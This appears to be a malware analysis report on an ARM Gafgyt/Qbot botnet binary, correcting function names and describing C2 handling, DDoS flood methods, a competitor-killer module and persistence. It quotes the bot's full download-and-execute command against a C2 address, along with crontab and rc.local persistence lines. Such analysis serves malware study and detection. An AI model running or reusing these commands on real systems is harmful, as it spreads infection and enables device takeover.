# Gafgyt/Qbot Botnet Binary - Function Rename Analysis Summary

## Binary: arm6 (ARM 32-bit LE ELF)

---

## Functions Renamed

### 1. `attack_dispatch` (0x8190) → `attack_self_replicate`

**Evidence (Verified Fact):**
- The function loads two string pointers from its literal pool:
  - 0x00016a00: `"mkdir -p /tmp; cd /tmp; rm -f update_bot; wget http://176.65.139.36/bins/arm6 -O update_bot || curl http://176.65.139.36/bins/arm6 -o update_bot || busybox wget http://176.65.139.36/bins/arm6 -O update_bot || toybox wget http://176.65.139.36/bins/arm6 -O update_bot; chmod +x update_bot; ./update_bot &"`
  - 0x00016b30: `"cd /data/local/tmp; rm -f update_bot; wget http://176.65.139.36/bins/arm6 -O update_bot || ..."`
- It calls `FUN_0001267c` (system() wrapper) twice with these URLs, then calls `sys_exit_group(0)`.
- **This is NOT dispatching attacks** — it downloads and executes the bot binary on the compromised device.
- Registered in `attack_init` as attack method ID 9.
- **Previous name was completely wrong** — it described the opposite of what the function does.

### 2. `attack_build_targets` (0x81b8) → `attack_start`

**Evidence (Verified Fact):**
- Called from `attack_parse_packet` with: duration, method_id, target_count, targets_array, option_count, options_array.
- Forks a supervisor process, which then forks a grandchild timer process.
- Timer process: `sleep(duration)` then `kill(getppid(), 9)` to terminate the attack.
- Supervisor process: looks up the method ID in the attack handler table and calls `(*handler)(targets, options)`.
- **Does NOT build targets** — targets are already parsed by `attack_parse_packet` before this function is called.
- **Previous name was misleading** — suggested target construction rather than attack execution.

### 3. `scanner_connect` (0xbee4) → `install_binary`

**Evidence (Verified Fact):**
- Opens `/proc/self/exe` (the running binary) for reading.
- Opens the destination path (passed as parameter) for writing with flags `O_WRONLY|O_CREAT|O_TRUNC` (0x241) and permissions 0755 (0x1ed).
- Copies data from source to destination in 4096-byte chunks.
- Saves the destination path to a global variable.
- **This is a file copy operation, not a network connect.**
- Called from `setup_persistence` with destination `/usr/bin/sys_audit`.
- **Previous name was completely wrong** — described a network operation for a file system operation.

### 4. `scanner_setup` (0xbf9c) → `setup_persistence`

**Evidence (Verified Fact):**
- Calls `install_binary("/usr/bin/sys_audit")` to copy itself.
- Calls `FUN_0001267c` (system()) with the string at 0x16e14: `"echo \"@reboot /usr/bin/sys_audit\" | crontab - 2>/dev/null"` — sets up crontab persistence.
- Gets system information via multiple `uname()` calls.
- Opens `/etc/rc.local` and appends `/usr/bin/sys_audit &\n` — adds itself to startup.
- **This is setting up persistence mechanisms, not scanner setup.**
- **Previous name was misleading** — suggested scanner initialization rather than persistence installation.

### 5. `scanner_report` (0xc0f4) → `write_pid_file`

**Evidence (Verified Fact):**
- Opens/creates `/var/run/sys_audit.reg` with flags `O_WRONLY|O_CREAT|O_TRUNC` (0x241) and permissions 0644 (0x1a4).
- Calls `sys_getpid()`, converts PID to string with `util_itoa`, and writes it to the file.
- Appends a newline character.
- **This writes a PID file, not a scanner report.**
- **Previous name was misleading** — suggested some reporting mechanism rather than PID file creation.

### 6. `scanner_init` (0xc174) → `install_and_spawn_killer`

**Evidence (Verified Fact):**
- Calls `setup_persistence()` — installs binary and configures persistence.
- Opens `/tmp/.sys_sync.lck` as a lock file with `O_RDWR|O_CREAT` (0x42) and sets up `fcntl(F_SETLK)`.
- Calls `write_pid_file()` — writes PID to `/var/run/sys_audit.reg`.
- Forks a child process that loops calling `killer_scan_proc()` (scans /proc for competing malware) with interspersed sleep calls.
- **This installs the binary, sets up persistence, AND spawns the killer process.**
- **Previous name was misleading** — suggested scanner initialization when it actually handles installation, persistence, and killer spawning.

### 7. `killer_init` (0xbc38) → `killer_count_strings`

**Evidence (Verified Fact):**
- Sets a counter to 0.
- Iterates through an array starting at index 1, counting non-null entries until a null entry is found.
- Stores the count in a global variable.
- **This counts the number of malware signature strings, not initializing the killer module.**
- **Previous name was vague** — "init" suggested full initialization when it only counts strings.

### 8. `attack_udp_custom` (0xaa38) → `attack_tcp_syn_custom`

**Evidence (Verified Fact):**
- Creates a raw socket with `sys_socket(2, 3, 6)` = `AF_INET, SOCK_RAW, IPPROTO_TCP`.
- Sets IP protocol byte to 6 (TCP) at offset 9 of the IP header.
- Sets TCP SYN flag (`pbVar21[0x21] |= 2`).
- Crafts TCP options including MSS, window scale, and timestamp.
- Sends raw TCP SYN packets to the target.
- Falls back to `attack_tcp_stomp` if raw socket creation fails.
- **This crafts TCP SYN packets, NOT UDP packets.**
- **Previous name was incorrect** — described UDP behavior for a TCP-based attack.

---

## Functions Confirmed as Correctly Named

| Function | Address | Verification |
|----------|---------|-------------|
| `killer_scan_proc` | 0xbc78 | Opens `/proc`, iterates PIDs, checks `/proc/PID/exe` and `/proc/PID/cmdline` for known malware strings ("busybox", "netcat", "python", "socket", "connect", "accept", "listen"), kills matching processes |
| `single_instance_bind` | 0xc260 | Binds to local port to ensure single instance of the bot |
| `attack_parse_packet` | 0x8650 | Parses C2 command packets, extracts duration, method ID, targets, and options |
| `attack_init` | 0x8a44 | Registers attack handler function pointers with method IDs |
| `killer_cleanup` | 0x833c | Kills all active attack child processes |
| `attack_udp_plain` | 0x8e74 | UDP plain flood using `SOCK_DGRAM` sockets |
| `attack_method_std` | 0x9160 | Standard UDP flood using `SOCK_DGRAM` with `IPPROTO_UDP` |
| `attack_method_raw` | 0x944c | Raw IP socket flood using `SOCK_RAW` |
| `attack_gre_flood` | 0x9844 | GRE protocol flood (IP protocol 47) |
| `attack_tcp_stomp` | 0x9e74 | TCP connection-based stomp flood |
| `attack_tcp_raw` | 0xa1d0 | Raw TCP packet flood with full IP/TCP header crafting |
| `attack_tcp_ack` | 0xb1ec | TCP ACK flood with raw sockets |
| `attack_udp_std_alt` | 0xb978 | Alternative UDP flood with randomized packet sizes |

---

## Analysis Gaps

### 1. `killer_sleep` (0xbc70) — No-op stub
- **Status: Unknown**
- Disassembly shows: `mov r0, #0; bx lr` — returns 0, ignores all arguments.
- Called from `install_and_spawn_killer`'s child loop with arguments (0x1700, 0x1309, 0xe5bb, 0x9dc7) that appear to be encoded sleep durations.
- These values may be XOR-encrypted sleep values that should be decoded through the table system, but the function itself is a no-op.
- **Cannot determine** if this is an intentionally disabled function, an optimization artifact, or a stripped function that was never fully implemented.

### 2. `killer_check_timer` (0xbc34) — Empty function
- **Status: Unknown**
- Disassembly shows: `bx lr` — returns immediately.
- Called periodically from the main select loop (every 12 iterations).
- **Cannot determine** the intended behavior — it's a complete no-op.

### 3. Syscall Wrapper Names
- **Status: Analytical Hypothesis**
- The syscall wrappers (`sys_send`, `sys_connect`, `sys_recv`, `sys_sendto`, etc.) appear to be misnamed based on their actual syscall numbers.
- For example, `sys_send` (0xf8d8) uses ARM EABI syscall 283 = `__NR_connect`, meaning it's actually a `connect()` wrapper.
- `sys_connect` (0xf8a0) uses syscall 282 = `__NR_bind`, meaning it's actually a `bind()` wrapper.
- **Not renamed in this pass** because: (a) these are utility/library-level wrappers, not malware-specific logic, and (b) renaming them would cascade through all calling functions and could cause confusion if the original source used different naming conventions.

### 4. `FUN_0001267c` — system() wrapper
- **Status: Verified Fact** (but not renamed)
- This function forks, executes a shell command in the child, and waits in the parent.
- It's the `system()` libc function.
- **Not renamed** because it's a standard library function, not malware-specific logic.

---

## Key Findings

### Botnet Identity
- **Family**: Gafgyt (Qbot) / Mirai variant
- **Architecture**: ARM 32-bit (v8), statically linked, stripped
- **C2 Download URL**: `http://176.65.139.36/bins/arm6`
- **Disguise Name**: `sys_audit` (binary copies itself to `/usr/bin/sys_audit`)

### Core Behavioral Flow

1. **Anti-Analysis & Single Instance**
   - Mprotects the binary's memory region
   - Masks SIGINT/SIGTERM, ignores SIGCHLD
   - Opens `/dev/watchdog` and disables it with `WDIOC_SETOPTIONS`
   - Binds to local port 51101 to ensure single instance

2. **Credential Handling**
   - Accepts a C2 password as `argv[1]` (max 31 chars)
   - Zeroes out `argv[1]` after copying for security
   - Default password stored in obfuscated table

3. **Process Hiding**
   - Rewrites `argv[0]` to disguise the process name
   - Double-forks for daemonization
   - Closes stdin/stdout/stderr after banner output

4. **Persistence (3 mechanisms)**
   - Copies itself to `/usr/bin/sys_audit`
   - Adds `@reboot /usr/bin/sys_audit` to crontab
   - Appends `/usr/bin/sys_audit &` to `/etc/rc.local`

5. **C2 Communication**
   - Connects to C2 server (TCP)
   - Sends local IP, password, and password length on connect
   - Select-based event loop with 10-second timeout
   - Heartbeat ping (`\x00\x00`) every ~60 seconds (6 select timeouts)

6. **Attack Execution Model**
   - C2 sends command packets containing: duration, method ID, target list, options
   - `attack_parse_packet` parses the packet and calls `attack_start`
   - `attack_start` double-forks: supervisor process runs the attack, grandchild timer kills supervisor when duration expires
   - 10 attack methods registered (IDs 1-10)

7. **Killer Module**
   - Scans `/proc` for process entries
   - Checks `/proc/PID/exe` and `/proc/PID/cmdline` for known malware strings
   - Kills competing malware processes (busybox, netcat, python, etc.)

8. **Self-Replication Attack (ID 9)**
   - Executes shell commands to download and run the bot binary on the compromised device
   - Uses multiple download methods (wget, curl, busybox wget, toybox wget)
   - Targets both standard Linux paths (`/tmp`) and Android paths (`/data/local/tmp`)
